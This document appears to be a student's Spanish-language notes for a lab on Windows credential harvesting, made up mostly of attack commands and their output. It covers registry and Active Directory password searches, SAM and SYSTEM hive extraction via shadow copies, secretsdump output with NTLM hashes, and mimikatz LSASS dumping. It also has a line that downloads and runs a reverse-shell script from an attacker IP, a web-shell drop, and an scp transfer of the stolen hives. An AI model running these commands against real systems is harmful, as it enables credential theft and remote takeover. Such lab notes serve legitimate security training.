
Machine IP: MACHINE_IP            Username: thm         Password: Passw0rd!


rdesktop -u thm -p Passw0rd! <IP_o_dominio>


xfreerdp /u:thm /p:Passw0rd! /v:10.201.52.15 /dynamic-resolution

## Como ejemplo de un comando de historial, un comando de PowerShell guarda los comandos ejecutados en un archivo de historial en un perfil de usuario, en la siguiente ruta: 

```bash
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```


##  reg query que mencionas se utiliza para buscar contraseñas almacenadas en el registro de Windows (Registry). Es una técnica común en auditorías de seguridad o pruebas de penetración para encontrar credenciales guardadas de forma insegura. 


- reg query: Consulta el registro de Windows.
- HKLM o HKCU:
- HKLM (HKEY_LOCAL_MACHINE): Contiene configuraciones globales del sistema.
- HKCU (HKEY_CURRENT_USER): Contiene configuraciones específicas del usuario actual.
- /f password: Busca la cadena "password" (no distingue mayúsculas/minúsculas).
- /t REG_SZ: Filtra solo valores de tipo cadena (REG_SZ).
- /s: Realiza una búsqueda recursiva en todas las subclaves.



c:\Users\user> reg query HKLM /f password /t REG_SZ /s #OR

C:\Users\user> reg query HKCU /f password /t REG_SZ /s




a) Buscar en HKEY_LOCAL_MACHINE (HKLM)

reg query HKLM /f "flag" /t REG_SZ /s


    HKLM: Clave del registro que almacena configuraciones globales del sistema.

    /f "flag": Busca la cadena exacta "flag" (no distingue mayúsculas/minúsculas).

    /t REG_SZ: Filtra solo valores de tipo cadena (texto).

    /s: Búsqueda recursiva en todas las subclaves.

b) Buscar en HKEY_CURRENT_USER (HKCU)
cmd
reg query HKCU /f "flag" /t REG_SZ /s





reg query HKLM /f "flag" /t REG_SZ /s


password:  7tyh4ckm3



# Enumerar Usuarios y Verificar Descripciones
En AD, a veces las contraseñas se guardan accidentalmente en el campo description (descripción).
Puedes enumerarlo con estos métodos:

net user /domain




# Método 2: Con PowerShell (Más detallado)
powershell
Get-ADUser -Filter * -Properties Description | Where-Object { $_.Description -ne $null } | Format-Table Name,Description
Filtra usuarios con descripciones no vacías.

Si hay un usuario llamado "victim", revisa su descripción.

# Método 3: Búsqueda Directa de Contraseñas
powershell

Get-ADUser -Filter {Description -like "*password*"} -Properties * | Select-Object DistinguishedName, SamAccountName, Description



Import-Module ActiveDirectory
Get-ADUser -Filter * -Properties * | Select-Object DistinguishedName, SamAccountName, Description





Obenert el HASH NTLM

# usaremos wmic para crear una instantánea de volumen.
 cd

privilege::debug
token::elevate
lsadump::sam



wmic shadowcopy call create Volume='C:\'



IEX(New-Object Net.WebClient).DownloadString('http://10.8.163.249:8000/shell.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.8.163.249:8000 -Port 4444



curl -u http://10.8.163.249:8000/shell.php -o C:\xampp\htdocs\shell.php 




wmic shadowcopy call create Volume='C:\'

    Executing (Win32_ShadowCopy)->create()
    Method execution successful.
    Out Parameters:
    instance of __PARAMETERS
    {
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
    };


vssadmin list shadows



copy \\?GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam

        1 file(s) copied.



copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.






reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg


reg save HKLM\system C:\users\Administrator\Desktop\system-reg


scp * kali@10.8.163.249:/home/kali/.


└─$ impacket-secretsdump -sam sam-reg -system system-reg LOCAL  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
                                                                                                                                                 
┌──(kali㉿kali)-[~/Downloads/CredentialsHarvesting]
└─$ 








smb://10.201.52.15/SYSVOL/
smb://10.201.52.15/NETLOGON/


















cd C:\Tools\Mimikatz\mimikatz.exe
!+
!processprotect /process:lsass.exe /remove
privilege::debug
sekurlsa::logonpasswords